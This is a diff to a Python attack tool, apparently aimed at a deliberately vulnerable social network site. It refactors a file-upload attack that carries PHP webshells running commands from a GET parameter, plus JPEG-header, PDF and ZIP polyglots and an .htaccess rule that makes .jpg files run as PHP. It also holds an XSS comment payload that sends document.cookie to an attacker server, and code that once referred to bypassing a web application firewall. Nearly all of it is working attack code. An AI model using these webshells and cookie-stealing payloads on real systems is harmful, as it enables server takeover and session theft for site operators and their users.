@@ -391,9 +391,6 @@ class AdvancedVulnerableSNSAttacker:
         upload_url = f"{self.base_url}/upload.php"
         file_url = f"{self.base_url}/file.php"
         
-        # 기본 웹쉘 코드
-        basic_webshell = b'<?php system($_GET["cmd"]); ?>'
-        
         # 다양한 웹쉘 변형
         webshell_variants = {
             'basic': b'<?php system($_GET["cmd"]); ?>',
@@ -404,6 +401,18 @@ class AdvancedVulnerableSNSAttacker:
             'create_function': b'<?php $$f=create_function("", $$_GET["cmd"]); $f(); ?>',
             'short_tag': b'<? system($_GET["cmd"]); ?>',
             'with_image_header': b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>'
+        }
+        
+        # 특수 파일 내용들
+        special_contents = {
+            'htaccess': b"""
+    AddType application/x-httpd-php .jpg
+    php_flag engine on
+    """,
+            'pdf_poly': b"""%PDF-1.4
+    <?php system($_GET["cmd"]); __halt_compiler(); ?>
+    """,
+            'zip_poly': b'PK\x03\x04<?php system($_GET["cmd"]); ?>'
         }
         
         # 다양한 우회 기법
@@ -454,20 +463,6 @@ class AdvancedVulnerableSNSAttacker:
             ('shell98.zip', 'application/zip', 'zip_poly', 'ZIP polyglot')
         ]
         
-        # htaccess 내용
-        htaccess_content = b"""
-AddType application/x-httpd-php .jpg
-php_flag engine on
-"""
-        
-        # PDF polyglot
-        pdf_polyglot = b"""%PDF-1.4
-<?php system($_GET["cmd"]); __halt_compiler(); ?>
-"""
-        
-        # ZIP polyglot (PHP 코드를 포함한 ZIP)
-        zip_polyglot = b'PK\x03\x04<?php system($_GET["cmd"]); ?>'
-        
         success_count = 0
         successful_shells = []
         uploaded_files = set()
@@ -494,21 +489,14 @@ php_flag engine on
                 print(f"    Variant: {variant}")
                 
                 # 웹쉘 내용 선택
-                if variant == 'htaccess':
-                    file_content = htaccess_content
-                elif variant == 'pdf_poly':
-                    file_content = pdf_polyglot
-                elif variant == 'zip_poly':
-                    file_content = zip_polyglot
+                if variant in special_contents:
+                    file_content = special_contents[variant]
                 elif variant in webshell_variants:
                     file_content = webshell_variants[variant]
                 else:
                     file_content = webshell_variants['basic']
                 
-                # 랜덤 경계 문자열 생성 (WAF 우회)
-                boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-                
-                # 수동으로 multipart/form-data 생성
+                # 파일 업로드
                 files = {'file': (filename, file_content, content_type)}
                 
                 # 추가 헤더로 우회 시도
@@ -1476,11 +1464,11 @@ php_flag engine on
             )
         ]
 
-        xss_payload_comment = [
+        xss_payload_comments = [
             # young /for comments
             (
                 f'<script>var cookieData = document.cookie;var i = new Image();i.src = "{self.attacker_server}?cookie="+cookieData;</script>',
-                'Image XSS Comment by YOUNG'
+                'Image XSS in Comment'
             )
         ]
 
@@ -1489,7 +1477,7 @@ php_flag engine on
         successful_payloads = []
 
         # 댓글 XSS 시도
-        for payload_c, description_c in xss_payload_comment:
+        for payload_c, description_c in xss_payload_comments:
             try:
                 self.add_delay()
 
@@ -1585,8 +1573,8 @@ php_flag engine on
                         )
                         
                         # 첫 번째 성공 후 빠르게 다른 것들도 테스트
-                        # if success_count >= 3:
-                        #     break
+                        if success_count >= 3:
+                            break
                     else:
                         print(f"[-] Payload filtered or encoded")
                         
